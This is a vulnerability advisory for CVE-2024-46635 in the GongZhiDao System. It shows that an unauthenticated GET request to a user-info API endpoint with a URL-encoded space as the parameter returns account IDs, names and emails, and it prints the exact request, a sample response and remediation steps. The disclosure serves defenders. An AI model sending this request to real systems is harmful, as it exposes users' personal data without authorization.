# CVE-2024-46635

## Background

The GongZhiDao System is a platform developed by GongZhiDao. It provides enterprise solutions including user management, data analysis, and operational functionalities. However, a security vulnerability was discovered in one of the API endpoints that could potentially lead to the exposure of sensitive user information without proper authorization.

## Vulnerability Description

A vulnerability exists in the `/oaa/api/AccountMaster/GetCurrentUserInfo` API endpoint of the GongZhiDao System. By passing `%20` (a URL-encoded space) in place of the `UserNameOrPhoneNumber` parameter, the API responds with sensitive user information, including account ID, username, and email address, even without proper authentication or authorization. This improper input validation allows attackers to gain unauthorized access to sensitive data.

## Impact

Successful exploitation of this vulnerability could lead to the exposure of sensitive user data, including:

- Account ID
- Username
- Email address
- Phone number (if present)
- Other personal information

An attacker could use this information to carry out further attacks, such as identity theft or phishing.

## Attack Vector

To exploit the vulnerability, an attacker must send a crafted HTTP GET request to the vulnerable API endpoint:

```http
GET /oaa/api/AccountMaster/GetCurrentUserInfo?UserNameOrPhoneNumber=%20 HTTP/2
```

This request returns a 200 OK response with sensitive user data in JSON format:

```http
HTTP/2 200 OK
Date: Tue, 10 Sep 2024 03:25:09 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 153
Server: nginx/1.22.0
X-Powered-By: ASP.NET
Set-Cookie: Path=/; HttpOnly; Secure

{"accountId":"09c05434-e1ff-4436-b1b0-01215e48b274","name":"John","phoneNumber":null,"userName":"19999999999","email1":"test@yourdomain.com"}
```


## Technical Details

- **Affected Endpoint**: `/oaa/api/AccountMaster/GetCurrentUserInfo`
- **Method**: HTTP GET
- **Parameters**: `UserNameOrPhoneNumber` with `%20` as the input
- **Response**: The API returns sensitive user data in JSON format without proper input validation or authorization.
- **Vulnerability Type**: Improper Input Validation / Sensitive Information Disclosure

## Remediation Recommendations

1. **Implement proper input validation**: Ensure that the `UserNameOrPhoneNumber` parameter is properly sanitized and validated. Inputs such as `%20` should be rejected.

2. **Authorization checks**: Implement proper authorization mechanisms to ensure that only authenticated and authorized users can access sensitive information.

3. **Rate limiting and monitoring**: Apply rate limiting to API endpoints to prevent brute force or automated attacks, and monitor API activity for abnormal access patterns.

## Credits

This vulnerability was discovered by hithub.

## References

- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
